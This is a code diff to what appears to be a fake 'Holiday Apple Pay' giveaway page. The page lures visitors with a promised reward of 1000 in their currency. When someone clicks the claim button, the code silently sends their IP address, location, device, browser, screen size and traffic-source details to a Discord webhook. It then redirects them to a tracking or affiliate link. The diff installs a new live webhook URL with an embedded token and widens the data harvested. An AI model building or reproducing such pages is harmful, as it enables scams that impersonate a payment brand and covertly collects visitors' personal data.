@@ -738,7 +738,7 @@
       // DISCORD WEBHOOK CONFIGURATION
       // ============================================
       // Replace with your Discord webhook URL
-      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1452720419403727023/TlMSb0YLINvm8Hz6DU_EZ178s91-Tc15vqGyf_tLFEa0mnWXCLkjfO93aiZeIvTwPb0e';
+      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1452722421630107698/OlKJNW0c6mECgyUYr3eMTt9qO1tD0BibHK_LYiZi79FiRz8VZqQQmoGcdP429wFSSlUx';
 
       // Names for notifications
       const NAMES = [
@@ -764,89 +764,124 @@
       // ============================================
       // DISCORD WEBHOOK FUNCTION
       // ============================================
-      async function sendToDiscordWebhook(eventType, data) {
-        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'https://discord.com/api/webhooks/1452720419403727023/TlMSb0YLINvm8Hz6DU_EZ178s91-Tc15vqGyf_tLFEa0mnWXCLkjfO93aiZeIvTwPb0e') {
+      function sendToDiscordWebhook(eventType, data) {
+        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'https://discord.com/api/webhooks/1452722421630107698/OlKJNW0c6mECgyUYr3eMTt9qO1tD0BibHK_LYiZi79FiRz8VZqQQmoGcdP429wFSSlUx') {
           console.log('Discord webhook not configured');
           return;
         }
 
-        try {
-          const timestamp = new Date().toISOString();
-          const embed = {
-            title: "🎄 Holiday Apple Pay - Button Click",
-            color: 0x000000, // Black color
-            fields: [
-              {
-                name: "Event Type",
-                value: eventType,
-                inline: true
-              },
-              {
-                name: "Amount",
-                value: data.amount || "N/A",
-                inline: true
-              },
-              {
-                name: "Currency",
-                value: data.currency || "N/A",
-                inline: true
-              },
-              {
-                name: "Country",
-                value: data.country || "Unknown",
-                inline: true
-              },
-              {
-                name: "Region",
-                value: data.region || "Unknown",
-                inline: true
-              },
-              {
-                name: "City",
-                value: data.city || "Unknown",
-                inline: true
-              },
-              {
-                name: "IP Address",
-                value: data.ip || "Unknown",
-                inline: true
-              },
-              {
-                name: "User Agent",
-                value: data.userAgent ? data.userAgent.substring(0, 100) : "Unknown",
-                inline: false
-              },
-              {
-                name: "Page URL",
-                value: data.pageUrl || window.location.href,
-                inline: false
-              },
-              {
-                name: "Referrer",
-                value: data.referrer || document.referrer || "Direct",
-                inline: false
-              }
-            ],
-            footer: {
-              text: "Apple Pay Tracker"
-            },
-            timestamp: timestamp
-          };
+        // Get current time info
+        const now = new Date();
+        const timeString = now.toLocaleTimeString('en-US', { 
+          hour: '2-digit', 
+          minute: '2-digit', 
+          second: '2-digit',
+          hour12: true 
+        });
+        const dateString = now.toLocaleDateString('en-US', { 
+          weekday: 'long', 
+          year: 'numeric', 
+          month: 'long', 
+          day: 'numeric' 
+        });
 
-          await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              embeds: [embed]
-            })
-          });
+        // Device info
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const deviceType = isMobile ? '📱 Mobile' : '💻 Desktop';
+        
+        // Browser detection
+        let browser = '🌐 Unknown';
+        if (navigator.userAgent.indexOf('Chrome') > -1) browser = '🔵 Chrome';
+        else if (navigator.userAgent.indexOf('Safari') > -1) browser = '🔵 Safari';
+        else if (navigator.userAgent.indexOf('Firefox') > -1) browser = '🦊 Firefox';
+        else if (navigator.userAgent.indexOf('Edge') > -1) browser = '🔷 Edge';
+        
+        // OS detection
+        let os = '💿 Unknown';
+        if (navigator.userAgent.indexOf('Win') > -1) os = '🪟 Windows';
+        else if (navigator.userAgent.indexOf('Mac') > -1) os = '🍎 macOS';
+        else if (navigator.userAgent.indexOf('Linux') > -1) os = '🐧 Linux';
+        else if (navigator.userAgent.indexOf('Android') > -1) os = '🤖 Android';
+        else if (navigator.userAgent.indexOf('iOS') > -1) os = '📱 iOS';
 
-          console.log('Webhook sent successfully');
-        } catch (error) {
-          console.error('Error sending webhook:', error);
-        }
+        const embed = {
+          title: "🎁 NEW CLAIM BUTTON CLICK!",
+          description: `**Someone just clicked the claim button!**\n━━━━━━━━━━━━━━━━━━━━`,
+          color: 0x00ff00, // Green for success
+          fields: [
+            {
+              name: "💰 Reward Details",
+              value: `**Amount:** ${data.amount || 'N/A'}\n**Currency:** ${data.currency || 'N/A'}`,
+              inline: true
+            },
+            {
+              name: "⏰ Time & Date",
+              value: `**Time:** ${timeString}\n**Date:** ${dateString}`,
+              inline: true
+            },
+            {
+              name: "\u200b",
+              value: "\u200b",
+              inline: false
+            },
+            {
+              name: "🌍 Location Info",
+              value: `**Country:** ${data.country || 'Unknown'} ${data.countryFlag || ''}\n**Region:** ${data.region || 'Unknown'}\n**City:** ${data.city || 'Unknown'}\n**IP:** \`${data.ip || 'Unknown'}\``,
+              inline: true
+            },
+            {
+              name: "📊 Device Info",
+              value: `**Type:** ${deviceType}\n**OS:** ${os}\n**Browser:** ${browser}\n**Screen:** ${data.screenResolution || 'Unknown'}`,
+              inline: true
+            },
+            {
+              name: "\u200b",
+              value: "\u200b",
+              inline: false
+            },
+            {
+              name: "🔗 Traffic Source",
+              value: `**Referrer:** ${data.referrer || 'Direct Traffic'}\n**Page URL:** ${data.pageUrl || 'Unknown'}`,
+              inline: false
+            },
+            {
+              name: "🖥️ User Agent",
+              value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 200) : 'Unknown'}\`\`\``,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "🎄 Holiday Apple Pay Tracker | Powered by Discord",
+            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+          },
+          timestamp: now.toISOString(),
+          thumbnail: {
+            url: "https://em-content.zobj.net/thumbs/160/apple/354/money-bag_1f4b0.png"
+          }
+        };
+
+        // Use fetch with proper error handling
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            username: "Apple Pay Tracker",
+            avatar_url: "https://em-content.zobj.net/thumbs/160/apple/354/gift_1f381.png",
+            embeds: [embed]
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log('✅ Webhook sent successfully!');
+          } else {
+            console.error('❌ Webhook failed:', response.status, response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error('❌ Error sending webhook:', error);
+        });
       }
 
       // Update currency
@@ -1030,22 +1065,65 @@
       // BUTTON CLICK HANDLER WITH WEBHOOK
       // ============================================
       document.getElementById('claimButton').addEventListener('click', function() {
-        // Collect tracking data
+        console.log('🎯 Button clicked! Preparing to send webhook...');
+        
+        // Country flag mapping
+        const countryFlags = {
+          'US': '🇺🇸', 'CA': '🇨🇦', 'GB': '🇬🇧', 'AU': '🇦🇺', 'DE': '🇩🇪',
+          'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱', 'SE': '🇸🇪',
+          'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'CH': '🇨🇭', 'AT': '🇦🇹',
+          'BE': '🇧🇪', 'IE': '🇮🇪', 'PT': '🇵🇹', 'JP': '🇯🇵', 'KR': '🇰🇷',
+          'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'NZ': '🇳🇿',
+          'SG': '🇸🇬', 'HK': '🇭🇰', 'TW': '🇹🇼'
+        };
+
+        // Get referrer with better formatting
+        let referrerText = 'Direct Traffic';
+        if (document.referrer) {
+          try {
+            const refUrl = new URL(document.referrer);
+            referrerText = refUrl.hostname;
+          } catch (e) {
+            referrerText = document.referrer;
+          }
+        }
+
+        // Get UTM parameters if present
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmSource = urlParams.get('utm_source');
+        const utmMedium = urlParams.get('utm_medium');
+        const utmCampaign = urlParams.get('utm_campaign');
+        
+        if (utmSource || utmMedium || utmCampaign) {
+          referrerText += `\n📊 UTM: ${utmSource || 'none'}/${utmMedium || 'none'}/${utmCampaign || 'none'}`;
+        }
+
+        // Collect comprehensive tracking data
         const trackingData = {
           amount: currentCurrency + "1000",
           currency: currentCurrency,
           country: userGeoData?.country || "Unknown",
+          countryFlag: countryFlags[userGeoData?.country] || '🌍',
           region: userGeoData?.region || "Unknown",
           city: userGeoData?.city || "Unknown",
           ip: userGeoData?.ip || "Unknown",
+          timezone: userGeoData?.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
           userAgent: navigator.userAgent,
           pageUrl: window.location.href,
-          referrer: document.referrer || "Direct",
+          referrer: referrerText,
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+          language: navigator.language || navigator.userLanguage,
+          platform: navigator.platform,
           timestamp: new Date().toISOString()
         };
 
-        // Send to Discord webhook
+        console.log('📦 Tracking data:', trackingData);
+
+        // Send to Discord webhook (non-blocking)
         sendToDiscordWebhook("Claim Button Clicked", trackingData);
+
+        console.log('✅ Webhook function called, opening link...');
 
         // Open the target URL
         window.open('https://www.ch6rrl8trk.com/3KFRZ6/27P3D6/?sub1=d2212pm', '_blank', 'noreferrer');
